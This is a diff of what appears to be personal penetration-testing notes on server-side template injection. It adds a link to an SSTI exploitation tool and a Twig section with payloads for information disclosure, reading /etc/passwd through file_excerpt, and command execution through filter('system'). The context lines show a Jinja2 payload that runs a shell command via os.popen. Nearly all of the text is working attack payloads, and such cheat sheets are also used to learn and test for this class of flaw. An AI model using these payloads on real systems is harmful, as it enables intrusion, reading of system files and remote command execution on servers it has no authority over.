@@ -1,4 +1,5 @@
 ____
+https://github.com/vladko312/SSTImap
 
 ![[Pasted image 20241004110914.png]]
 
@@ -27,4 +28,25 @@ ____
 ```jinja2
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+
+# Twig
+
+## Information Disclosure
+
+```twig
+{{ _self }}
+```
+
+## LFI
+
+```twig
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+```
+
+## RCE
+
+```twig
+{{ ['id'] | filter('system') }}
+```
+
 
